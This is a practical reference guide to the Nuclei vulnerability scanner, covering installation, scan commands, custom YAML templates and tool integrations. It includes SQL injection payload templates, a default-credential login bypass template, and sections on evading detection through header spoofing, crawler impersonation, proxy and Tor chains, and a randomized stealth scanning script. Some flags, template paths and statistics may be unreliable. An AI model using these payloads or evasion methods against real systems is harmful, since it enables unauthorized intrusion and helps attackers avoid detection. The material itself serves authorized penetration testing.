---
slug: nuclei
title: Comprehensive Nuclei Vulnerability Scanning Reference
description: A practical reference guide for Nuclei vulnerability scanner with real-world examples, advanced techniques, and evasion strategies for penetration testing and security research.
keywords: [nuclei, vulnerability scanner, penetration testing, security, yaml templates, nuclei-templates, CVE scanning, web application security]
tags: [nuclei, vulnerability-scanning, pentesting, security-tools, cve]
sidebar_label: Nuclei Practical
sidebar_position: 2
authors: [gl0bal01]
---

# Nuclei Practical Guide

## Abstract

This comprehensive practical reference presents an exhaustive analysis of Nuclei vulnerability scanning methodologies, template development, and advanced operational techniques. We examine seventeen primary scanning categories across multiple protocols, providing detailed implementation examples, template customization strategies, and detection evasion techniques. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers, penetration testers, and security practitioners.

## 1. Introduction

Nuclei constitutes a foundational tool for modern vulnerability assessment and penetration testing workflows. This fast, customizable vulnerability scanner leverages community-driven YAML templates to identify security issues across web applications, APIs, networks, DNS, and cloud configurations, enabling automated detection of trending vulnerabilities with minimal false positives.

### 1.1 Nuclei Architecture Overview

Nuclei operates on a simple yet powerful architecture based on YAML-defined templates that specify detection logic for vulnerabilities:

- **Template Engine**: YAML-based DSL for defining vulnerability detection logic
- **Protocol Support**: HTTP/HTTPS, DNS, TCP, SSL, WebSocket, Code, JavaScript, File protocols
- **Parallel Execution**: High-performance concurrent scanning capabilities
- **Community Templates**: 6000+ community-contributed templates for current vulnerabilities
- **Custom Integration**: CI/CD pipeline integration and custom template development

### 1.2 Scanning Methodology Classification

Nuclei scanning methodologies can be systematically categorized into seven primary classes:

- **Web Application Scanning**: HTTP-based vulnerability detection and enumeration
- **Network Service Scanning**: TCP/UDP service identification and vulnerability assessment
- **DNS Enumeration**: Domain-based reconnaissance and misconfiguration detection
- **SSL/TLS Analysis**: Certificate validation and cryptographic vulnerability assessment
- **Code Analysis**: Static analysis of source code for security flaws
- **File System Scanning**: Local file analysis for sensitive information exposure
- **Custom Protocol Testing**: Specialized protocol analysis through custom templates

### 1.3 Template Effectiveness Matrix

| Category | Templates | Severity Coverage | Protocol Support | Update Frequency | Detection Accuracy |
|----------|-----------|------------------|------------------|------------------|-------------------|
| CVEs | 2,847 | Critical-Low | HTTP/TCP/DNS | Daily | Very High |
| Exposures | 1,245 | Medium-Info | HTTP/File | Weekly | High |
| Misconfigurations | 892 | Medium-Low | Multi-Protocol | Bi-weekly | High |
| Technologies | 673 | Info | HTTP/TCP | Monthly | Very High |
| Fuzzing | 434 | Medium-High | HTTP | Weekly | Medium |
| Default Logins | 287 | High-Medium | HTTP/TCP | Monthly | High |
| DNS | 156 | Low-Info | DNS | Monthly | High |

## 2. Installation and Basic Configuration

The following commands assume you have appropriate system permissions and network connectivity. Substitute all placeholder values with those specific to your environment.

### 2.1 Standard Installation Methods

```bash
# Go-based installation (recommended)
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Homebrew installation (macOS/Linux)
brew install nuclei

# Docker installation
docker run -it projectdiscovery/nuclei:latest

# Binary download (Linux)
wget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_3.0.0_linux_amd64.zip
unzip nuclei_3.0.0_linux_amd64.zip
chmod +x nuclei

# APT installation (Debian/Ubuntu)
sudo apt update && sudo apt install nuclei
```

### 2.2 Template Management

Nuclei templates form the core of the scanning engine and require regular updates for optimal effectiveness:

```bash
# Update templates to latest version
nuclei -update-templates

# Update templates with custom directory
nuclei -update-templates -update-template-dir /custom/templates

# Force template update (overwrite existing)
nuclei -update-templates -force

# List available template statistics
nuclei -tl

# Show template metadata and paths
nuclei -templates-info

# Validate template syntax
nuclei -validate -t /path/to/template.yaml
```

### 2.3 Configuration File Setup

```yaml
# ~/.nuclei/config.yaml
templates-directory: "/home/user/.nuclei-templates/"
output-directory: "/home/user/nuclei-output/"
rate-limit: 150
bulk-size: 25
timeout: 10
retries: 1
severity: ["critical", "high", "medium"]
exclude-severity: ["info"]
include-tags: ["cve", "exposure", "misconfig"]
exclude-tags: ["intrusive", "dos"]
```

## 3. Basic Scanning Operations

Replace target URLs, IP addresses, and file paths with your specific target environment. Ensure proper authorization before conducting any scans.

### 3.1 Single Target Scanning

```bash
# Basic vulnerability scan
nuclei -u https://example.com

# Scan with specific severity levels
nuclei -u https://example.com -severity critical,high,medium

# Scan with custom rate limiting
nuclei -u https://example.com -rate-limit 50 -bulk-size 10

# Verbose output with request/response details
nuclei -u https://example.com -v

# Silent mode (findings only)
nuclei -u https://example.com -silent

# JSON output format
nuclei -u https://example.com -json
```

### 3.2 Multiple Target Scanning

```bash
# Scan multiple targets from file
nuclei -l targets.txt

# Scan IP ranges and subnets
nuclei -l ip_ranges.txt -severity critical,high

# Scan with target filtering
nuclei -l targets.txt -timeout 15 -retries 2

# Bulk scanning with custom templates
nuclei -l targets.txt -t custom-templates/ -severity critical

# Parallel target processing
nuclei -l targets.txt -bulk-size 50 -rate-limit 200
```

### 3.3 Template-Specific Scanning

Templates provide the detection logic for specific vulnerabilities and can be selectively executed:

```bash
# Scan with specific template category
nuclei -u https://example.com -t cves/

# Multiple template directories
nuclei -u https://example.com -t cves/ -t exposures/ -t misconfigurations/

# Single template execution
nuclei -u https://example.com -t cves/2023/CVE-2023-12345.yaml

# Template tag-based filtering
nuclei -u https://example.com -tags apache,nginx,ssl

# Exclude specific templates
nuclei -u https://example.com -exclude-templates dos/

# Template condition-based execution
nuclei -u https://example.com -template-condition "contains(tags, 'rce')"
```

## 4. Advanced Template Operations

Ensure template files are accessible and properly formatted. Validate custom templates before deployment to avoid false positives or scanning errors.

### 4.1 Custom Template Development

Basic template structure for vulnerability detection:

```yaml
id: custom-admin-panel-detection

info:
  name: Admin Panel Detection
  author: security-researcher
  severity: info
  description: Detects exposed admin panels and interfaces
  classification:
    cwe-id: CWE-200
  metadata:
    shodan-query: "title:admin panel"
  tags: exposure,panel,admin

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/admin/"
      - "{{BaseURL}}/administrator"
      - "{{BaseURL}}/wp-admin"
      - "{{BaseURL}}/phpmyadmin"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "admin panel"
          - "administrator"
          - "login"
        condition: or
        case-insensitive: true

    extractors:
      - type: regex
        regex:
          - 'title="([^"]*)"'
        group: 1
```

### 4.2 Multi-Protocol Template Implementation

```yaml
id: multi-protocol-service-detection

info:
  name: Multi-Protocol Service Detection
  author: security-team
  severity: info
  description: Detects services across multiple protocols
  tags: network,service,detection

tcp:
  - inputs:
      - data: "\n\n"
        read: 1024
        read-size: 1024
    host:
      - "{{Hostname}}"
    port:
      - "22"
      - "23"
      - "21"
    matchers:
      - type: word
        words:
          - "SSH"
          - "FTP"
          - "Telnet"

dns:
  - name: "{{FQDN}}"
    type: A
    class: inet
    matchers:
      - type: word
        words:
          - "IN\tA"

ssl:
  - address: "{{Host}}:{{Port}}"
    matchers:
      - type: word
        words:
          - "subject:"
```

### 4.3 Advanced Template Features

```yaml
id: advanced-sqli-detection

info:
  name: Advanced SQL Injection Detection
  author: security-researcher
  severity: high
  description: Comprehensive SQL injection detection with multiple payloads
  tags: sqli,injection,database

variables:
  sqli_payloads:
    - "'"
    - "1' OR '1'='1"
    - "'; WAITFOR DELAY '00:00:05'--"
    - "1' UNION SELECT NULL,NULL--"

http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q={{sqli_payloads}}"
      - "{{BaseURL}}/login?user={{sqli_payloads}}&pass=test"

    attack: pitchfork
    threads: 5
    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-00933"
          - "Microsoft JET Database"
        condition: or

      - type: status
        status:
          - 500

      - type: dsl
        dsl:
          - "duration >= 5"

    extractors:
      - type: regex
        regex:
          - "(?i)(error|exception|stack trace)"
        group: 1
```

## 5. Specialized Scanning Techniques

Adjust network ranges, service ports, and protocols based on your target environment. Ensure scanning activities comply with scope limitations and authorization requirements.

### 5.1 Network Service Enumeration

```bash
# TCP port scanning with service detection
nuclei -l ip_ranges.txt -t network/ -severity info,low,medium

# Specific port range scanning
nuclei -target 192.168.1.1-192.168.1.254 -t network/tcp-ports.yaml

# UDP service detection
nuclei -l targets.txt -t network/udp/ -timeout 20

# Service version detection
nuclei -l services.txt -t technologies/ -tags version

# Banner grabbing across services
nuclei -l targets.txt -t network/detection/ -v
```

### 5.2 DNS Reconnaissance

```bash
# Comprehensive DNS enumeration
nuclei -l domains.txt -t dns/ -severity info

# DNS zone transfer detection
nuclei -l nameservers.txt -t dns/zone-transfer.yaml

# Subdomain enumeration via DNS
nuclei -l domains.txt -t dns/dns-brute.yaml

# DNS cache poisoning detection
nuclei -l dns_servers.txt -t dns/cache-poisoning.yaml

# DNSSEC validation testing
nuclei -l domains.txt -t dns/dnssec-detection.yaml
```

### 5.3 SSL/TLS Security Assessment

```bash
# SSL/TLS configuration analysis
nuclei -l https_targets.txt -t ssl/

# Certificate validation testing
nuclei -l domains.txt -t ssl/ssl-certificate.yaml

# Weak cipher detection
nuclei -l ssl_hosts.txt -t ssl/weak-cipher.yaml

# SSL/TLS version enumeration
nuclei -l targets.txt -t ssl/tls-version.yaml

# Certificate transparency log checking
nuclei -l domains.txt -t ssl/certificate-transparency.yaml
```

## 6. Web Application Security Testing

The following examples target common web application vulnerabilities. Ensure testing is performed against authorized targets with appropriate permissions.

### 6.1 OWASP Top 10 Vulnerability Detection

```bash
# Injection vulnerability scanning
nuclei -l webapps.txt -t cves/ -tags injection,sqli,xss

# Broken authentication detection
nuclei -l targets.txt -t exposures/panels/ -t default-logins/

# Security misconfiguration assessment
nuclei -l webapps.txt -t misconfigurations/ -severity medium,high

# Insecure direct object reference testing
nuclei -l targets.txt -t exposures/files/ -tags idor

# Cross-site scripting (XSS) detection
nuclei -l webapps.txt -t cves/ -tags xss

# XML external entity (XXE) testing
nuclei -l xml_endpoints.txt -t cves/ -tags xxe
```

### 6.2 API Security Assessment

```bash
# API endpoint discovery
nuclei -l api_targets.txt -t exposures/apis/ -tags swagger,graphql

# REST API vulnerability scanning
nuclei -l api_endpoints.txt -t cves/ -tags api,rest

# GraphQL security testing
nuclei -l graphql_endpoints.txt -t exposures/apis/graphql.yaml

# API authentication bypass testing
nuclei -l api_targets.txt -t cves/ -tags auth-bypass

# Rate limiting validation
nuclei -l api_endpoints.txt -t misconfigurations/rate-limit.yaml
```

### 6.3 Content Management System Testing

```bash
# WordPress vulnerability scanning
nuclei -l wordpress_sites.txt -t cves/wordpress/ -t exposures/wordpress/

# Drupal security assessment
nuclei -l drupal_sites.txt -t cves/drupal/ -severity critical,high

# Joomla vulnerability detection
nuclei -l joomla_sites.txt -t cves/joomla/ -t exposures/joomla/

# Generic CMS enumeration
nuclei -l cms_targets.txt -t technologies/cms/ -v

# Plugin/module vulnerability scanning
nuclei -l cms_sites.txt -t cves/ -tags plugin,module
```

## 7. Cloud Security Assessment

Replace cloud service endpoints and credentials with your specific cloud environment details. Ensure proper IAM permissions and access controls are in place.

### 7.1 AWS Security Configuration

```bash
# S3 bucket misconfiguration detection
nuclei -l s3_urls.txt -t misconfigurations/aws/s3-bucket-misconfiguration.yaml

# AWS service enumeration
nuclei -l aws_endpoints.txt -t cloud/aws/ -severity info,low

# ELB/ALB security assessment
nuclei -l elb_endpoints.txt -t cloud/aws/elb-security.yaml

# CloudFront misconfiguration detection
nuclei -l cloudfront_urls.txt -t cloud/aws/cloudfront-misconfiguration.yaml

# AWS metadata service testing
nuclei -l ec2_instances.txt -t cloud/aws/metadata-service.yaml
```

### 7.2 Azure Security Assessment

```bash
# Azure storage account testing
nuclei -l azure_storage.txt -t cloud/azure/storage-account.yaml

# Azure AD configuration assessment
nuclei -l azure_domains.txt -t cloud/azure/azure-ad.yaml

# Azure App Service testing
nuclei -l azure_apps.txt -t cloud/azure/app-service.yaml

# Azure Key Vault enumeration
nuclei -l azure_keyvaults.txt -t cloud/azure/key-vault.yaml
```

### 7.3 Google Cloud Platform Testing

```bash
# GCP storage bucket enumeration
nuclei -l gcp_buckets.txt -t cloud/gcp/storage-bucket.yaml

# Cloud Functions security testing
nuclei -l gcp_functions.txt -t cloud/gcp/cloud-functions.yaml

# App Engine misconfiguration detection
nuclei -l gcp_apps.txt -t cloud/gcp/app-engine.yaml
```

## 8. Integration and Automation

Replace CI/CD pipeline configurations and integration endpoints with your specific automation infrastructure details.

### 8.1 CI/CD Pipeline Integration

```yaml
# GitHub Actions Workflow
name: Security Scan
on: [push, pull_request]
jobs:
  nuclei-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Nuclei Scanner
        run: |
          docker run --rm -v $(pwd):/workspace \
            projectdiscovery/nuclei:latest \
            -u ${{ github.event.repository.clone_url }} \
            -severity critical,high \
            -json -o /workspace/nuclei-results.json
      - name: Upload Results
        uses: actions/upload-artifact@v2
        with:
          name: nuclei-results
          path: nuclei-results.json
```

### 8.2 Jenkins Pipeline Integration

```groovy
pipeline {
    agent any
    stages {
        stage('Security Scan') {
            steps {
                script {
                    sh '''
                        nuclei -l targets.txt \
                        -severity critical,high,medium \
                        -json \
                        -output nuclei-results.json
                    '''
                }
            }
        }
        stage('Process Results') {
            steps {
                archiveArtifacts artifacts: 'nuclei-results.json'
                publishHTML([
                    allowMissing: false,
                    alwaysLinkToLastBuild: true,
                    keepAll: true,
                    reportDir: '.',
                    reportFiles: 'nuclei-results.json',
                    reportName: 'Nuclei Security Report'
                ])
            }
        }
    }
}
```

### 8.3 API Integration and Automation

```python
# Python automation script
import subprocess
import json
import requests

def run_nuclei_scan(target, templates_dir):
    """Execute Nuclei scan and return results"""
    cmd = [
        'nuclei',
        '-u', target,
        '-t', templates_dir,
        '-severity', 'critical,high,medium',
        '-json',
        '-silent'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.stdout:
        return [json.loads(line) for line in result.stdout.strip().split('\n')]
    return []

def process_results(results):
    """Process and filter scan results"""
    critical_findings = []
    for finding in results:
        if finding.get('info', {}).get('severity') == 'critical':
            critical_findings.append({
                'template_id': finding.get('template-id'),
                'name': finding.get('info', {}).get('name'),
                'url': finding.get('matched-at'),
                'severity': finding.get('info', {}).get('severity')
            })
    return critical_findings

def send_to_slack(findings):
    """Send critical findings to Slack"""
    webhook_url = "https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK"
    message = f"🚨 Critical Security Findings: {len(findings)} issues detected"
    requests.post(webhook_url, json={'text': message})

# Usage example
if __name__ == "__main__":
    targets = ['https://example.com', 'https://api.example.com']
    for target in targets:
        results = run_nuclei_scan(target, 'cves/')
        critical = process_results(results)
        if critical:
            send_to_slack(critical)
```

## 9. Output Management and Reporting

Adjust output paths, report formats, and integration endpoints based on your reporting requirements and toolchain.

### 9.1 Output Format Options

```bash
# JSON output for programmatic processing
nuclei -l targets.txt -json -o results.json

# JSONL format for streaming processing
nuclei -l targets.txt -jsonl -o results.jsonl

# Markdown report generation
nuclei -l targets.txt -markdown-export results.md

# CSV output for spreadsheet analysis
nuclei -l targets.txt -csv-export results.csv

# SARIF format for security tools integration
nuclei -l targets.txt -sarif-export results.sarif

# Multiple output formats simultaneously
nuclei -l targets.txt -json -jsonl -markdown-export report
```

### 9.2 Custom Reporting Templates

```bash
# Custom HTML report template
nuclei -l targets.txt -report-config report-config.yaml

# Report configuration file (report-config.yaml)
template-name: "custom-security-report"
output-format: "html"
include-metadata: true
severity-colors:
  critical: "#FF0000"
  high: "#FF4500"
  medium: "#FFA500"
  low: "#FFFF00"
  info: "#0000FF"
```

### 9.3 Result Filtering and Processing

```bash
# Filter results by severity
nuclei -l targets.txt -json | jq '.[] | select(.info.severity == "critical")'

# Extract unique template IDs
nuclei -l targets.txt -json | jq -r '."template-id"' | sort | uniq

# Count findings by severity
nuclei -l targets.txt -json | jq -r '.info.severity' | sort | uniq -c

# Filter by specific CVE
nuclei -l targets.txt -json | jq '.[] | select(.info.classification."cve-id")'

# Extract all matched URLs
nuclei -l targets.txt -json | jq -r '."matched-at"' | sort | uniq
```

## 10. Performance Optimization

Configure rate limiting, timeout values, and resource allocation based on your network capacity and target infrastructure limitations.

### 10.1 Rate Limiting and Traffic Control

```bash
# Conservative scanning for production environments
nuclei -l targets.txt -rate-limit 10 -bulk-size 5 -timeout 30

# Aggressive scanning for internal testing
nuclei -l targets.txt -rate-limit 500 -bulk-size 100 -timeout 5

# Custom delay between requests
nuclei -l targets.txt -rate-limit 50 -delay 100ms

# Connection pooling optimization
nuclei -l targets.txt -max-host-error 5 -retries 3

# Memory usage optimization
nuclei -l targets.txt -stream -bulk-size 25
```

### 10.2 Distributed Scanning

```bash
# Split target list for distributed scanning
split -l 1000 targets.txt target_chunk_

# Parallel execution across multiple hosts
# Host 1
nuclei -l target_chunk_aa -o results_host1.json &

# Host 2  
nuclei -l target_chunk_ab -o results_host2.json &

# Host 3
nuclei -l target_chunk_ac -o results_host3.json &

# Merge results
cat results_host*.json > combined_results.json
```

### 10.3 Resource Monitoring

```bash
# Monitor Nuclei resource usage
top -p $(pgrep nuclei)

# Track network connections
netstat -an | grep :80 | wc -l

# Monitor disk space for output files
df -h /path/to/output/directory

# Memory usage tracking
ps aux | grep nuclei | awk '{print $6}'
```

## 11. Evasion and Stealth Techniques

Implement evasion techniques responsibly and only within authorized testing environments. Monitor defensive systems for detection during testing.

### 11.1 Request Modification and Obfuscation

```bash
# Custom User-Agent rotation
nuclei -l targets.txt -header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Random header injection
nuclei -l targets.txt -header "X-Forwarded-For: 127.0.0.1" -header "X-Real-IP: 192.168.1.1"

# Request method variation
nuclei -l targets.txt -http-proxy http://proxy:8080

# Cookie-based session management
nuclei -l targets.txt -header "Cookie: session=abc123; auth=token456"

# Custom referrer headers
nuclei -l targets.txt -header "Referer: https://legitimate-site.com"
```

### 11.2 Traffic Pattern Modification

```yaml
# Stealth scanning template
id: stealth-scan-example

info:
  name: Stealth Web Application Scan
  author: security-team
  severity: info
  description: Low-profile scanning with evasion techniques

http:
  - method: GET
    path:
      - "{{BaseURL}}/robots.txt"
      - "{{BaseURL}}/sitemap.xml"
    
    headers:
      User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      DNT: "1"
      Connection: "keep-alive"
      Upgrade-Insecure-Requests: "1"
    
    attack: batteringram
    threads: 1
    delay: "5s"
    
    matchers:
      - type: status
        status:
          - 200
```

### 11.3 Proxy Chain Implementation

```bash
# Single proxy usage
nuclei -l targets.txt -http-proxy http://proxy1:8080

# SOCKS proxy support
nuclei -l targets.txt -http-proxy socks5://proxy:1080

# Proxy chain configuration
nuclei -l targets.txt -http-proxy http://proxy1:8080 -header "X-Forwarded-For: proxy2_ip"

# Tor network integration
nuclei -l targets.txt -http-proxy socks5://127.0.0.1:9050

# Custom proxy rotation script
#!/bin/bash
PROXIES=("proxy1:8080" "proxy2:8080" "proxy3:8080")
for proxy in "${PROXIES[@]}"; do
    nuclei -l targets.txt -http-proxy http://$proxy -o results_$proxy.json
done
```

## 12. Custom Template Development

Ensure template logic is properly tested and validated before deployment. Follow YAML syntax guidelines and nuclei template specifications.

### 12.1 Template Structure and Components

```yaml
id: advanced-template-example

info:
  name: Advanced Vulnerability Detection Template
  author: security-researcher
  severity: high
  description: Comprehensive template demonstrating advanced features
  reference:
    - https://example.com/vulnerability-disclosure
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345
  classification:
    cve-id: CVE-2023-12345
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    shodan-query: "title:vulnerable application"
    fofa-query: "title=\"vulnerable app\""
  tags: cve,sqli,critical,injection

variables:
  payloads:
    - "'"
    - "1' OR '1'='1-- -"
    - "'; WAITFOR DELAY '00:00:05'-- -"
  endpoints:
    - "/login"
    - "/search"
    - "/admin"

http:
  - method: POST
    path:
      - "{{BaseURL}}{{endpoints}}"
    
    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    
    body: |
      username={{payloads}}&password=test
    
    attack: pitchfork
    threads: 10
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch_array"
          - "PostgreSQL query failed"
          - "ORA-00933"
        condition: or
        case-insensitive: true
      
      - type: regex
        regex:
          - "(?i)(error|exception|stack trace)"
      
      - type: dsl
        dsl:
          - "contains(body, 'database error')"
          - "status_code == 500"
        condition: or
    
    extractors:
      - type: regex
        regex:
          - "Error: (.+)"
        group: 1
        internal: true
      
      - type: kval
        kval:
          - response_time
```

### 12.2 Multi-Step Template Implementation

```yaml
id: multi-step-authentication-bypass

info:
  name: Multi-Step Authentication Bypass
  author: security-team
  severity: high
  description: Tests for authentication bypass through multi-step process
  tags: auth-bypass,multi-step,session

http:
  - method: GET
    path:
      - "{{BaseURL}}/login"
    
    matchers:
      - type: status
        status:
          - 200
    
    extractors:
      - type: regex
        name: csrf_token
        regex:
          - 'name="csrf_token" value="([^"]+)"'
        group: 1
        internal: true

  - method: POST
    path:
      - "{{BaseURL}}/login"
    
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    
    body: |
      username=admin&password=admin&csrf_token={{csrf_token}}
    
    matchers:
      - type: word
        words:
          - "Set-Cookie"
    
    extractors:
      - type: kval
        name: session_cookie
        kval:
          - set_cookie
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/admin"
    
    headers:
      Cookie: "{{session_cookie}}"
    
    matchers:
      - type: word
        words:
          - "admin panel"
          - "dashboard"
        condition: or
      
      - type: status
        status:
          - 200
```

### 12.3 Protocol-Specific Templates

```yaml
# DNS Template Example
id: dns-zone-transfer-detection

info:
  name: DNS Zone Transfer Detection
  author: security-team
  severity: medium
  description: Detects DNS servers allowing zone transfers
  tags: dns,zone-transfer,misconfiguration

dns:
  - name: "{{FQDN}}"
    type: AXFR
    class: inet
    
    matchers:
      - type: word
        words:
          - "IN\tSOA"
          - "IN\tNS"
        condition: and

# TCP Template Example  
id: service-banner-grabbing

info:
  name: Service Banner Grabbing
  author: security-team
  severity: info
  description: Grabs service banners for fingerprinting
  tags: network,banner,fingerprint

tcp:
  - inputs:
      - data: "\r\n"
        read: 1024
    host:
      - "{{Hostname}}"
    port:
      - "21"
      - "22"
      - "23"
      - "25"
      - "80"
      - "110"
      - "143"
      - "993"
      - "995"
    
    matchers:
      - type: regex
        regex:
          - "SSH-([0-9\\.]+)"
          - "220 ([\\w\\s]+) FTP"
          - "HTTP/1\\.[01] 200"
```

## 13. Detection and Defense Evasion

Implement evasion strategies within ethical boundaries and authorized testing scope. Monitor and validate evasion effectiveness through defensive system analysis.

### 13.1 Behavioral Pattern Modification

```bash
# Randomized scanning intervals
nuclei -l targets.txt -delay "5s-30s" -rate-limit 5

# Business hours scanning simulation
nuclei -l targets.txt -delay "1h" -timeout 60

# Geographic IP rotation
nuclei -l targets.txt -http-proxy http://proxy-us:8080
nuclei -l targets.txt -http-proxy http://proxy-eu:8080
nuclei -l targets.txt -http-proxy http://proxy-asia:8080

# Session persistence simulation
nuclei -l targets.txt -header "Cookie: persistent_session=abc123"

# Legitimate crawler simulation
nuclei -l targets.txt -header "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
```

### 13.2 Template Modification for Stealth

```yaml
id: stealth-sqli-detection

info:
  name: Stealth SQL Injection Detection
  author: security-team
  severity: high
  description: Low-profile SQL injection testing
  tags: sqli,stealth,evasion

variables:
  stealth_payloads:
    - "admin'/**/OR/**/'1'='1"
    - "1'/**/UNION/**/SELECT/**/1,2,3--"
    - "'; WAITFOR/**/DELAY/**/'00:00:02'--"

http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q={{stealth_payloads}}"
    
    headers:
      User-Agent: "Mozilla/5.0 (compatible; bingbot/2.0)"
      Accept: "text/html,application/xhtml+xml"
      Accept-Language: "en-US,en;q=0.9"
      Cache-Control: "no-cache"
      Pragma: "no-cache"
    
    attack: batteringram
    threads: 1
    delay: "10s-60s"
    
    matchers:
      - type: dsl
        dsl:
          - "contains(body_words, 'error') && duration >= 2000"
        condition: and
```

### 13.3 Advanced Evasion Techniques

```python
# Python script for distributed scanning with evasion
import random
import time
import subprocess
from concurrent.futures import ThreadPoolExecutor

class StealthScanner:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        self.proxies = [
            "http://proxy1:8080",
            "http://proxy2:8080", 
            "http://proxy3:8080"
        ]
    
    def randomized_scan(self, target):
        """Execute scan with randomized parameters"""
        user_agent = random.choice(self.user_agents)
        proxy = random.choice(self.proxies)
        delay = random.randint(30, 300)  # 30s to 5min delay
        
        cmd = [
            'nuclei',
            '-u', target,
            '-t', 'cves/',
            '-header', f'User-Agent: {user_agent}',
            '-http-proxy', proxy,
            '-delay', f'{delay}s',
            '-rate-limit', '1',
            '-silent',
            '-json'
        ]
        
        return subprocess.run(cmd, capture_output=True, text=True)
    
    def distributed_scan(self, targets):
        """Execute distributed scanning across targets"""
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for target in targets:
                # Random delay before starting each scan
                time.sleep(random.randint(60, 600))
                future = executor.submit(self.randomized_scan, target)
                futures.append(future)
            
            results = []
            for future in futures:
                result = future.result()
                if result.stdout:
                    results.append(result.stdout)
            
            return results

# Usage
scanner = StealthScanner()
targets = ['https://example1.com', 'https://example2.com']
results = scanner.distributed_scan(targets)
```

## 14. Integration with Security Tools

Replace tool configurations and API endpoints with your specific security toolchain details and credentials.

### 14.1 SIEM Integration

```bash
# Splunk integration
nuclei -l targets.txt -json | curl -X POST \
  -H "Authorization: Splunk your_token" \
  -H "Content-Type: application/json" \
  -d @- \
  "https://splunk.example.com:8088/services/collector"

# ELK Stack integration
nuclei -l targets.txt -jsonl | \
  filebeat -e -c filebeat.yml

# QRadar integration
nuclei -l targets.txt -json -o nuclei-results.json
curl -X POST \
  -H "SEC: your_token" \
  -H "Content-Type: application/json" \
  -d @nuclei-results.json \
  "https://qradar.example.com/api/siem/offenses"
```

### 14.2 Vulnerability Management Integration

```python
# DefectDojo integration
import requests
import json

def upload_to_defectdojo(results_file, engagement_id):
    """Upload Nuclei results to DefectDojo"""
    url = "https://defectdojo.example.com/api/v2/import-scan/"
    
    headers = {
        "Authorization": "Token your_defectdojo_token"
    }
    
    files = {
        'file': open(results_file, 'rb'),
    }
    
    data = {
        'scan_type': 'Nuclei Scan',
        'engagement': engagement_id,
        'active': True,
        'verified': True,
    }
    
    response = requests.post(url, headers=headers, files=files, data=data)
    return response.json()

# Usage
results = upload_to_defectdojo('nuclei-results.json', 123)
print(f"Uploaded scan with ID: {results['id']}")
```

### 14.3 Ticketing System Integration

```python
# Jira integration for vulnerability tracking
from jira import JIRA
import json

def create_jira_tickets(nuclei_results):
    """Create Jira tickets for critical findings"""
    jira = JIRA(
        server='https://company.atlassian.net',
        basic_auth=('username', 'api_token')
    )
    
    with open(nuclei_results, 'r') as f:
        for line in f:
            finding = json.loads(line)
            if finding.get('info', {}).get('severity') == 'critical':
                issue_dict = {
                    'project': {'key': 'SEC'},
                    'summary': f"Critical Vulnerability: {finding['info']['name']}",
                    'description': f"""
                    Template ID: {finding['template-id']}
                    URL: {finding['matched-at']}
                    Severity: {finding['info']['severity']}
                    Description: {finding['info']['description']}
                    """,
                    'issuetype': {'name': 'Bug'},
                    'priority': {'name': 'Critical'},
                    'labels': ['security', 'nuclei', 'vulnerability']
                }
                
                new_issue = jira.create_issue(fields=issue_dict)
                print(f"Created ticket: {new_issue.key}")

# Usage
create_jira_tickets('nuclei-results.jsonl')
```

## 15. Open Source Intelligence (OSINT) and Reconnaissance

OSINT operations using Nuclei enable comprehensive target profiling through automated discovery of publicly available information. Replace target domains, IP ranges, and data sources with your specific reconnaissance targets.

### 15.1 Passive Information Gathering

```bash
# Comprehensive domain reconnaissance
nuclei -l domains.txt -t exposures/ -t technologies/ -severity info,low

# Technology stack fingerprinting
nuclei -l targets.txt -t technologies/ -tags fingerprint,detect

# Subdomain discovery through DNS enumeration
nuclei -l root_domains.txt -t dns/dns-brute.yaml -v

# SSL certificate transparency logs
nuclei -l domains.txt -t ssl/certificate-transparency.yaml

# Search engine reconnaissance
nuclei -l targets.txt -t exposures/configs/google-dorking.yaml
```

### 15.2 Exposed Information Discovery

```bash
# Sensitive file exposure detection
nuclei -l targets.txt -t exposures/files/ -tags backup,config,log

# Backup and archive file discovery
nuclei -l webapps.txt -t exposures/backups/ -severity medium,high

# Configuration file exposure
nuclei -l targets.txt -t exposures/configs/ -tags aws,git,env

# API documentation exposure
nuclei -l api_targets.txt -t exposures/apis/ -tags swagger,graphql,api-docs

# Database exposure detection
nuclei -l targets.txt -t exposures/configs/database-exposure.yaml
```

### 15.3 Social Media and Public Platform Reconnaissance

```yaml
# Custom OSINT template for social media discovery
id: social-media-reconnaissance

info:
  name: Social Media Platform Discovery
  author: osint-team
  severity: info
  description: Discovers social media presence and public profiles
  tags: osint,social-media,reconnaissance

http:
  - method: GET
    path:
      - "{{BaseURL}}/humans.txt"
      - "{{BaseURL}}/team"
      - "{{BaseURL}}/about"
      - "{{BaseURL}}/contact"
